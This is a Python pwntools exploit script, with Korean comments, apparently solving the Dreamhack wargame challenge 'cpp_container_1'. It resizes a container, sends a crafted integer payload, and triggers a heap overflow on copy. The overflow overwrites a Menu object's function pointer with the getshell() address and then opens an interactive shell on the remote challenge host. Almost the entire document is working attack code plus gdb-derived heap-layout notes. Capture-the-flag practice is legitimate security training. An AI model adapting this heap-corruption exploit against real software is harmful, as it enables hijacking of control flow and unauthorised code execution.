#!/usr/bin/env python3
# cpp_container_1 — heap overflow -> Menu::fp overwrite -> getshell
# run: /home/kirin/.venv/pwn/bin/python3 cpp_container_1.py

from pwn import *

p = remote("host3.dreamhack.games", 8925)
e = ELF('./cpp_container_1')
context.arch = 'amd64'

# C++ 심볼은 맹글링돼 있다: getshell() -> _Z8getshellv
GETSHELL = e.symbols["_Z8getshellv"]    # 0x401041, No PIE 라서 고정


class Container:
    MENU_END = b"[*] select menu: "

    def __init__(self, io):
        self.io = io
        self.size1 = 3
        self.size2 = 3

    def _menu(self, choice):
        self.io.sendlineafter(self.MENU_END, str(choice).encode())

    def _num(self, value):
        self.io.sendline(str(value).encode())

    def _nums(self, values):
        if values:
            self.io.send(b"\n".join(str(v).encode() for v in values) + b"\n")

    # ---- 1. make container ----
    def make(self, data1, data2):

        assert len(data1) == self.size1, f"data1 must be {self.size1} ints"
        assert len(data2) == self.size2, f"data2 must be {self.size2} ints"

        self._menu(1)
        self.io.recvuntil(b"Input container1 data")
        self._nums(data1)
        self.io.recvuntil(b"Input container2 data")
        self._nums(data2)

    # ---- 2. modify container ----
    def modify(self, size1, size2):
        self._menu(2)
        self.io.sendlineafter(b"Input container1 size", str(size1).encode())
        self.io.sendlineafter(b"Input container2 size", str(size2).encode())
        self.size1 = size1
        self.size2 = size2

    # ---- 3. copy container ----
    def copy(self):
        self._menu(3)
        self.io.recvuntil(b"copy complete!")

    # ---- 4. view container ----
    def view(self):
        self._menu(4)
        out = []
        for tag in (b"container1 data: [", b"container2 data: ["):
            self.io.recvuntil(tag)
            body = self.io.recvuntil(b"]", drop=True)
            out.append([int(t) for t in body.split(b",") if t.strip()])
        return out

    # ---- 5. exit ----
    def exit(self):
        self._menu(5)


# ---------------------------------------------------------------
# 힙 레이아웃 (gdb 실측)
#
#   0x617020  src  버퍼      ┐
#   0x617040  dest 버퍼      ├─ 전부 malloc(12) / new(8) -> 0x20 청크
#   0x617060  menu->fp       ┘   = 32바이트(int 8칸) 간격
#
#   dest[0..3]  dest 청크 안 (패딩)
#   dest[4..7]  menu 청크 헤더   (prev_size=0, size=0x21)
#   dest[8..9]  menu->fp         <- 타겟 (8바이트 = int 2칸)
# ---------------------------------------------------------------

SIZE = 10                               # dest[9] 까지 쓰려면 10개

payload = [0] * SIZE
payload[6] = 0x21                       # menu 청크 size 필드 복원 (0x20 | PREV_INUSE)
payload[8] = GETSHELL & 0xffffffff      # fp 하위 4바이트 = 0x401041
payload[9] = GETSHELL >> 32             # fp 상위 4바이트 = 0

c = Container(p)

c.modify(SIZE, 3)                       # src 만 키운다. dest 를 키우면 재할당돼서 menu 옆자리를 떠남
c.make(payload, [0, 0, 0])              # dest 쪽 3개도 반드시 보내야 cin 이 안 꼬인다
c.copy()                                # 여기서 overflow -> menu->fp = getshell

log.success("menu->fp -> getshell(%#x)", GETSHELL)

# menu->fp 를 덮었으니 메뉴 프롬프트가 더 이상 출력되지 않는다.
# sendlineafter 로 기다리면 영원히 블록된다.
p.interactive()
